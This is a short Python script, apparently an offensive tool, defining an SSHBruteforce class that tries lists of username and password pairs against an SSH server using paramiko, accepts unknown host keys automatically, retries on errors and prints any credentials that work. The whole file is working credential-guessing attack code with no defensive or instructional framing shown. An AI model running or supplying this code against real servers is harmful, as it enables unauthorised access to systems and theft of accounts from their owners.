import socket, paramiko, time

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

class SSHBruteforce:
    @staticmethod
    def Exploit(host,port,combo):
        for (user,passw) in combo:

            try:
                client.connect(hostname=host, username=user, password=passw, port=port, timeout=5)
            except socket.timeout:
                continue

            except paramiko.AuthenticationException:
                continue

            except paramiko.SSHException:
                print("[*] Retrying in 5 seconds.")
                time.sleep(5)
                return SSHBruteforce.Exploit(host,port,combo)

            else:
                print(f"[!] Found combo [{host}:{user}:{passw}].")

